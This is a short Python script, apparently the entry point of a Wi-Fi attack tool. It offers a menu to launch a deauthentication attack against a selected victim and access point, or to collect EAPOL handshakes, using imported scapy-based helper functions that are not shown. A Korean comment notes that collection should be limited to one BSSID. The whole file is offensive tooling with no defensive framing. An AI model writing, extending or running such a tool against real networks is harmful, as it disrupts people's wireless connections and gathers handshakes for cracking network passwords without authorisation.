
import os, sys
from scapy.all import conf
from def_selIface import selIface
from def_selMac import selMac
from def_atkDeauth import atkDeauth
from def_collEapol import collEapol

if os.geteuid() != 0:
    sys.exit("Only root can run this script.")

conf.iface = selIface()
print('1. DeAuth Attack')
print('2. EAPOL Collect')
print('')
print('[Your Interface : '+conf.iface+']')
print('')

choice = input('Choose option : ')
if choice == '1':
    vicAddr, bssAddr = selMac()
    atkDeauth(vicAddr, bssAddr)
elif choice == '2':
    collEapol()
    # 특정 BSSID만 수집하도록 수정 요망


print('exit')